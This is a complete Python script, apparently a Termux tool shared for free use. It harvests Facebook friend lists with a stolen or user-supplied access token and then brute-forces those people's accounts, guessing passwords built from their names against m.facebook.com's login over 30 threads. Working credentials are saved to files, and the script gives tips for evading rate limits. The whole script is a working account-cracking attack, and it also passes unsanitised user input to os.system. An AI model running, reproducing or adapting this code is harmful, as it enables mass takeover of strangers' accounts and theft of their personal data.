# Full Open Source Code
# Coded By @Sptty Chan
# https://www.facebook.com/100024425583446
# https://github.com/Zez11

#   Release Date : Jum,11 Feb,2022
#   Simple Look, Easy To Understand
#   Easy To Use ✓
#   Free For Use ✓

import requests,bs4,json,os,sys,random,datetime,time

try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')

from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col

# UA LIST
try:uao = open('user.txt','r').readlines()
except:uao = ['Mozilla/5.0 (Linux; Android 8.1.0; S45B Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36']

# INDICATION
id,id2,loop,ok,cp,map = [],[],0,0,0,0

# COLORS
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +

# Converter Bulan
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

# CLEAR
def clear():
	os.system('clear')

# BACK
def back():
	login()

# BANNER
def banner():
	clear()
	wel = '# WELCOME TO SC TERMUX GENZIBHIZER'
	wel2 = mark(wel, style='cyan')
	sol().print(wel2, style='on red')
	ise = '# INFORMASI PENGEMBANG'
	fc = mark(ise, style='green')
	sol().print(fc)
	tap = me()
	tap.add_column('Author', style='yellow', justify='center')
	tap.add_column('Github', style='yellow', justify='center')
	tap.add_row('GENZI','https://github.com/Zez11')
	sol().print(tap, justify='center')

# VALIDASI TOKEN
def login():
	try:
		token = open('token.txt','r').read()
		try:
			sy = requests.get('https://graph.facebook.com/me?access_token='+token)
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			sy4 = json.loads(sy.text)['birthday']
			menu(sy2,sy3,sy4)
		except KeyError:
			login_lagi()
		except requests.exceptions.ConnectionError:
			banner()
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi()

# LOGIN
def login_lagi():
	banner()
	sky = '# LOGIN MENGGUNAKAN AKSES TOKEN'
	sky2 = mark(sky, style='green')
	sol().print(sky2, style='cyan')
	panda = input(x+'['+p+'f'+x+'] Token : ')
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes2 = json.loads(tes.text)['name']
		tes3 = json.loads(tes.text)['id']
		tes4 = json.loads(tes.text)['birthday']
		open('token.txt','w').write(panda)
		sue = '# Login Sukses, Tunggu Sebentar!'
		suu = mark(sue, style='green')
		sol().print(suu, style='cyan')
		time.sleep(2.5)
		menu(tes2,tes3,tes4)
	except KeyError:
		sue = '# Login Gagal, Periksa Token Anda!'
		suu = mark(sue, style='red')
		sol().print(suu, style='cyan')
		time.sleep(2.5)
		login_lagi()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()

# MENU
def menu(my_name,my_id,my_birthday):
	try:
		sh = requests.get('https://httpbin.org/ip').json()
	except:pass
	try:
		tglx = my_birthday.split('/')[1]
		blnx = dic2[str(my_birthday.split('/')[0])]
		thnx = my_birthday.split('/')[2]
		birth = tglx+' '+blnx+' '+thnx
	except:
		birth = '-'
	banner()
	sg = '# MENU TOOLS'
	fx = mark(sg, style='green')
	sol().print(fx)
	print(x+'['+h+'•'+x+'] Active User : '+str(my_name))
	print(x+'['+h+'•'+x+'] User Id     : '+str(my_id))
	print(x+'['+h+'•'+x+'] User Ttl    : '+str(birth))
	print(x+'['+h+'•'+x+'] Ip Address  : '+str(sh['origin']))
	io = '[01] Crack Dari Pertemanan Publik\n[02] Crack Dari Pertemanan Publik (Massal)\n[03] Cek Result Crack\n[00] Log Out'
	oi = nel(io, style='cyan')
	cetak(nel(oi, title='MENU'))
	jh = input(x+'['+p+'f'+x+'] Pilih : ')
	if jh in ['1','01']:
		dump_publik()
	elif jh in ['2','02']:
		dump_massal()
	elif jh in ['3','03']:
		result()
	elif jh in ['0','00']:
		os.system('rm -rf token.txt')
		print(x+'['+h+'•'+x+'] Wait ...')
		time.sleep(1)
		sw = '# BERHASIL LOG OUT'
		sol().print(mark(sw, style='green'))
		exit()
	else:
		ric = '# PILIHAN TIDAK ADA DI MENU'
		sol().print(mark(ric, style='red'))
		exit()

def result():
	cek = '# CEK RESULT CRACK'
	sol().print(mark(cek, style='green'))
	kayes = '[01] Cek Hasil Cp\n[02] Cek Hasil Ok\n[00] Kembali Ke Menu'
	kis = nel(kayes, style='cyan')
	cetak(nel(kis, title='RESULTS'))
	kz = input(x+'['+p+'f'+x+'] Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			gada = '# DIREKTORI TIDAK DITEMUKAN'
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# ANDA BELUM MEMILIKI RESULT CP'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			for isi in vin:
				try:
					hem = open('CP/'+isi,'r').readlines()
				except:continue
				gerr = '# HASIL CP ANDA'
				sol().print(mark(gerr, style='green'))
				print(b+isi+' ---> '+str(len(hem))+' Akun'+x)
			gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
			sol().print(mark(gerr2, style='green'))
			print(x+'['+h+'•'+x+'] Contoh : '+cpc)
			geh = input(x+'['+p+'f'+x+'] Pilih : ')
			try:
				lin = open('CP/'+geh,'r').read()
			except:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '# LIST AKUN CP ANDA'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd CP && cat '+geh)
			akun2 = '# LIST AKUN CP ANDA'
			sol().print(mark(akun, style='green'))
			input(x+'['+h+'•'+x+'] Kembali')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			gada = '# DIREKTORI TIDAK DITEMUKAN'
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# ANDA BELUM MEMILIKI RESULT OK'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			for isi in vin:
				try:
					hem = open('OK/'+isi,'r').readlines()
				except:continue
				gerr = '# HASIL OK ANDA'
				sol().print(mark(gerr, style='green'))
				print(h+isi+' ---> '+str(len(hem))+' Akun'+x)
			gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
			sol().print(mark(gerr2, style='green'))
			print(x+'['+h+'•'+x+'] Contoh : '+okc)
			geh = input(x+'['+p+'f'+x+'] Pilih : ')
			try:
				lin = open('OK/'+geh,'r').read()
			except:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '# LIST AKUN OK ANDA'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd OK && cat '+geh)
			akun2 = '# LIST AKUN OK ANDA'
			sol().print(mark(akun, style='green'))
			input(x+'['+h+'•'+x+'] Kembali')
			back()
	elif kz in ['3','03']:
		back()
	else:
		ric = '# PILIHAN TIDAK ADA DI MENU'
		sol().print(mark(ric, style='red'))
		exit()

# DUMP ID PUBLIK
def dump_publik():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	win = '# DUMP ID PUBLIK'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
	pil = input(x+'['+p+'f'+x+'] Masukkan ID Target : ')
	try:
		koh = requests.get('https://graph.facebook.com/'+pil+'?access_token='+token)
		grex = json.loads(koh.text)['name']
		kras = '# INFO TARGET'
		kras2 = mark(kras, style='green')
		sol().print(kras2)
		print(x+'['+h+'•'+x+'] Nama  : '+str(grex))
	except (KeyError,IOError):
		teks = '# ID Tidak Ditemukan'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		time.sleep(2)
		exit()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'/friends?limit=5000&access_token='+token)
		koh3 = json.loads(koh2.text)
		for pi in koh3['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(x+'['+h+'•'+x+'] Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()

# DUMP ID MASSAL
def dump_massal():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	win = '# DUMP ID PUBLIK MASSAL'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] MASUKKAN JUMLAH ID (LIMIT 10)')
	try:
		jum = int(input(x+'['+p+'f'+x+'] BERAPA ID : '))
	except ValueError:
		pesan = '# INPUT YANG ANDA MASUKKAN BUKAN ANGKA'
		pesan2 = mark(pesan, style='red')
		sol().print(pesan2)
		exit()
	if jum<1 or jum>10:
		pesan = '# OUT OF RANGE MEN'
		pesan2 = mark(pesan, style='red')
		sol().print(pesan2)
		exit()
	uid = []
	yz = 0
	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = requests.get('https://graph.facebook.com/'+userr+'/friends?limit=5000&access_token='+token)
			col2 = json.loads(col.text)
			for mi in col2['data']:
				try:
					iso = mi['id']+'|'+mi['name']
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	tot = '# BERHASIL MENGUMPULKAN %s ID'%(len(id))
	if len(id)==0:
		tot2 = mark(tot, style='red')
	else:
		tot2 = mark(tot, style='green')
	sol().print(tot2)
	setting()

# PENGATURAN ID
def setting():
	wl = '# SETTING URUTAN ID'
	sol().print(mark(wl, style='green'))
	teks = '[01] Crack Dari Akun Tertua (Not Recommended)\n[02] Crack Dari Akun Termuda (Recommended)\n[03] Acak Urutan ID (Highly Recommended)'
	tak = nel(teks, style='cyan')
	cetak(nel(tak, title='SETTING'))
	hu = input(x+'['+p+'f'+x+'] Pilih : ')
	if hu in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif hu in ['2','02']:
		for bacot in id:
			id2.insert(0,bacot)
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		ric = '# PILIHAN TIDAK ADA DI MENU'
		sol().print(mark(ric, style='red'))
		exit()
	passwrd()

# WORDLIST
def passwrd():
	global loop
	ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
	sol().print(mark(ler, style='green'))
	krek = 'Hasil Live Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)
	cetak(nel(krek, title='CRACK'))
	pool = tred(max_workers=30)
	for yuzong in id2:
		idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
		frs = nmf.split(' ')[0]
		pwv = []
		if len(nmf)<6:
			if len(frs)<3:
				loop+=1
				continue
			else:
				pwv.append(frs+'123')
				pwv.append(frs+'12345')
		else:
			if len(frs)<3:
				pwv.append(nmf)
			else:
				pwv.append(nmf)
				pwv.append(frs+'123')
				pwv.append(frs+'12345')
		pool.submit(crack,idf,pwv)

# CRACKER
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s---> %s/%s ---> ok*%s ---> cp*%s ---> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(uao).replace('\n','')
	ses = requests.Session()
	for pw in pwv:
		try:
			head = {"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			dt = {'email': idf,'pass': pw,'login': 'submit'}
			z = ses.get('https://m.facebook.com')
			j = ses.post('https://m.facebook.com/login.php', data=dt, headers=head, allow_redirects=True)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> CP       '%(b,idf,pw))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       '%(h,idf,pw))
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				ok+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

if __name__=='__main__':
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	login()